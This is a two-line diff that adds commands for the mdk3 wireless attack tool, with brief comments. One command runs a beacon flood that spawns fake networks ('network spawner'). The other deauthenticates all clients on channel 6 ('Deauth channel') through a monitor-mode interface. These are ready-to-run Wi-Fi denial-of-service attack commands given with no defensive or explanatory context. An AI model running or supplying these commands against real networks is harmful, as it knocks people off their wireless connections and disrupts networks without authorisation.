@@ -1,0 +1,2 @@
+mdk3 wlan0mon b -t xx:xx:xx:xx:xx:xx -c X // network spawner
+mdk3 wlan0mon d -c 6 //Deauth channel
